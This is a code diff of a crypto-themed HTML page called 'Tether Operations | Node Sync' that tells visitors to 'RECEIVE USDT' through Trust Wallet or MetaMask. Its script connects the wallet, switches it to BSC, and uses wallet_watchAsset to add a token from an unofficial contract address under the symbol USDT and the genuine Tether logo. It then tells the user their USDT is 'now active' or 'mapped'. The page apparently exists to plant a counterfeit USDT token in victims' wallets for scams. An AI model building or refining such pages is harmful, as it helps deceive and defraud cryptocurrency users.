@@ -4,124 +4,123 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tether Operations | Node Sync</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
-        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
-        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 380px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
         
-        /* Updated Button Container */
-        .receive-options { display: flex; gap: 15px; margin-top: 30px; justify-content: center; }
-        .action-btn { background: var(--card-bg); border: 2px solid #2d333b; border-radius: 50%; width: 70px; height: 70px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-        .action-btn:hover { border-color: var(--tether-green); transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,192,135,0.2); }
-        .action-btn:active { transform: scale(0.95); }
-        .action-btn img { width: 35px; height: 35px; }
+        .usdt-main { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--tether-green)); }
         
-        #log-area { font-size: 10px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; text-transform: uppercase; }
+        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: 25px; }
         
-        /* Removed old elements: RECEIVE USDT text, Allocated Node Value box */
+        /* Receive Buttons */
+        .wallet-btn { 
+            background: #1c1f24; border: 1px solid #2d333b; color: #fff; 
+            padding: 15px; border-radius: 12px; font-size: 15px; font-weight: 700; 
+            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 12px;
+            transition: 0.3s;
+        }
+        .wallet-btn:hover { border-color: var(--tether-green); background: #24292e; }
+        .wallet-btn img { width: 28px; height: 28px; }
+
+        #log-area { font-size: 11px; color: #26a17b; margin-top: 20px; font-family: monospace; min-height: 15px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo-ring">
-        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
-    </div>
-    <p style="font-size: 13px; color: #848d97;">Select your wallet for node bridge sync.</p>
-    
-    <div class="receive-options">
-        <button class="action-btn" onclick="startSync('trust')">
-            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0x6B175474E89094C44Da98b954EedeAC495271d0F/logo.png" alt="Trust">
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-main" alt="USDT">
+    <p style="color: #848d97; font-size: 14px;">Select destination wallet to map node metadata.</p>
+
+    <div class="btn-container">
+        <button class="wallet-btn" onclick="connectWallet('trust')">
+            RECEIVE USDT <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" alt="Trust">
         </button>
-        <button class="action-btn" onclick="startSync('metamask')">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
+
+        <button class="wallet-btn" onclick="connectWallet('metamask')">
+            RECEIVE USDT <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
         </button>
     </div>
 
-    <div id="log-area">SYSTEM: AWAITING SELECTION</div>
+    <div id="log-area">> SYSTEM READY</div>
 </div>
 
 <script>
     const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function startSync(walletType) {
+    async function connectWallet(type) {
         const log = document.getElementById('log-area');
         let provider;
 
-        // Wallet Detection
-        if (walletType === 'trust') {
+        // 1. Precise Provider Selection (Conflict Fix)
+        if (type === 'trust') {
             provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
-            log.innerText = "> TARGETING TRUST WALLET...";
         } else {
             if (window.ethereum?.providers) {
                 provider = window.ethereum.providers.find(p => p.isMetaMask);
             } else if (window.ethereum?.isMetaMask) {
                 provider = window.ethereum;
             }
-            log.innerText = "> TARGETING METAMASK...";
         }
 
         if (!provider) {
-            alert(walletType.toUpperCase() + " Extension not found!");
-            log.innerText = "> ERROR: WALLET NOT FOUND";
+            alert(type.toUpperCase() + " not found! Please install the extension.");
             return;
         }
 
         try {
-            log.innerText = "> REQUESTING HANDSHAKE...";
-            await provider.request({ method: 'eth_requestAccounts' });
+            log.innerText = "> INITIALIZING " + type.toUpperCase() + "...";
             
-            // Sync to BSC Network
-            log.innerText = "> SYNCING NETWORK (BSC)...";
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            }).catch(async (err) => {
+            // Connection Request
+            await provider.request({ method: 'eth_requestAccounts' });
+
+            // Switch to BSC (Zaroori for Logo)
+            log.innerText = "> MAPPING BSC NETWORK...";
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
+            } catch (err) {
                 if (err.code === 4902) {
                     await provider.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: '0x38',
-                            chainName: 'Smart Chain',
+                            chainName: 'BSC Mainnet',
                             nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
                             blockExplorerUrls: ['https://bscscan.com/']
                         }]
                     });
                 }
-            });
+            }
 
-            log.innerText = "> INJECTING ASSET METADATA...";
-            // High-Power Asset Injection
-            const added = await provider.request({
+            // The Injection (Watch Asset)
+            log.innerText = "> INJECTING ASSET LOGO...";
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
                         address: CONTRACT_ADDR,
-                        symbol: 'USDT',
+                        symbol: 'USDT', 
                         decimals: 6,
                         image: TOKEN_LOGO,
                     },
                 },
             });
 
-            if (added) {
-                log.innerText = "> SYNC SUCCESSFUL!";
-                // You can add a special message here or a redirect
-                alert("Node Sync Complete! Your USDT assets are now active.");
-            }
-        } catch (err) {
-            console.error(err);
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Success! USDT is now mapped to your wallet.");
+
+        } catch (error) {
+            console.error(error);
             log.innerText = "> ERROR: HANDSHAKE FAILED";
         }
     }
 </script>
+
 </body>
 </html>
